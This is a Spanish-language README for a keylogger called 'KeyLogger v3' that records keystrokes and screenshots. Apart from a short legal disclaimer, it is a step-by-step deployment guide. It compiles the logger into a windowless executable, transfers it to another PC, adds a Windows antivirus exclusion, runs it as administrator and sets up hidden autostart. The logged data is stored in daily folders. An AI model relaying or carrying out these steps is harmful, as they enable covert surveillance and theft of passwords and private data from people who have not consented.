# KeyLogger v3 - Laboratorio (Modo Local)

Registrador de teclas + capturas de pantalla con organización diaria
y empaquetado automático. Diseñado para análisis en laboratorio.

## ⚠️ Advertencia legal

Este software es EXCLUSIVAMENTE para uso educativo en entornos controlados
(máquinas virtuales aisladas, CTF, pentesting autorizado).
Su uso en equipos de terceros sin consentimiento explícito por escrito
es ILEGAL y puede conllevar cargos penales.

El autor no se responsabiliza por el mal uso.

---

## 📋 Requisitos

- Python 3.8 o superior
- Windows / Linux / macOS (probado en Windows)
- Permisos de usuario para crear carpetas en `~`

### Dependencias (se instalan automáticamente si faltan)

- `pynput` — captura de teclado
- `pyscreenshot` — captura de pantalla

---

## 🚀 Instalación y uso

### 1. Ejecución directa desde Python

```bash
python keylogger_v3.py




1.2 Compilar
Desde la carpeta donde está keylogger_v3.py:

bash
pyinstaller --onefile --noconsole keylogger_v3.py
1.3 Ubicar el ejecutable
text
📁 tu_carpeta/
   ├── build/              ← ignorar (temporal)
   ├── dist/
   │   └── keylogger_v3.exe   ← ESTE es el que se transfiere
   └── keylogger_v3.spec   ← ignorar
2. Qué transferir a la otra PC
✅ Copiar	❌ NO copiar
dist/keylogger_v3.exe	Carpeta build/
Archivo .spec
Python o dependencias
Solo se transfiere 1 archivo: keylogger_v3.exe (~15-40 MB).

3. Preparar la PC destino
3.1 Desbloquear el archivo
Clic derecho en keylogger_v3.exe → Propiedades

Si aparece "Desbloquear" abajo → marcarlo → Aplicar

3.2 Excluir del antivirus
Seguridad de Windows → Protección antivirus

Administrar configuración → Exclusiones

Agregar la carpeta donde estará el .exe

El .exe de PyInstaller suele dar falso positivo.

4. Ejecutar
4.1 Prueba manual (primera vez)
Clic derecho → Ejecutar como administrador

Verificar que se cree C:\Users\<usuario>\.klab\

4.2 Arranque automático con Windows
Opción A — Carpeta de Inicio (simple):

Windows + R → escribir shell:startup → Enter

Crear acceso directo al .exe y pegarlo ahí

Opción B — Programador de Tareas (con permisos elevados):

Abrir "Programador de tareas" → Crear tarea

General: marcar "Ejecutar con privilegios más altos"

Desencadenador: "Al iniciar el equipo" (retraso 1 min)

Acción: iniciar el .exe

5. Dónde quedan los datos
text
C:\Users\<usuario>\.klab\
├── 2026-10-05\              ← día en curso (carpeta activa)
│   ├── keys\
│   └── screenshots\
├── 2026-10-04.zip           ← días anteriores comprimidos
├── 2026-10-03.zip
└── info.txt
Regla: al cambiar de día, la carpeta se comprime automáticamente a .zip.

6. Detener el keylogger
Método	Cómo
Admin. de tareas	Buscar proceso → Finalizar tarea
Tarea programada	Deshabilitar en el Programador
Desde Python	Ctrl + C
7. Configuración rápida (editar en el .py antes de compilar)
Variable	Default	Qué controla
SCREENSHOT_EVERY	10	Segundos entre capturas
MAX_KEYS_PER_FILE	5000	Rotación del archivo de teclas
AUTO_LIMPIAR_DIAS	True	Borrar carpeta tras comprimir
8. Troubleshooting
Problema	Solución
Antivirus borra el .exe	Agregar exclusión
No captura en apps admin	Ejecutar como administrador
No se crea el ZIP del día	Verificar permisos en ~/.klab/
Screenshots negras (Linux)	Usar X11, no Wayland
9. Flujo resumido
text
1. pip install pyinstaller
2. pyinstaller --onefile --noconsole keylogger_v3.py
3. Copiar dist/keylogger_v3.exe a la otra PC
4. Desbloquear + excluir del antivirus
5. Ejecutar como admin (prueba)
6. Configurar arranque automático
7. Los datos quedan en ~/.klab/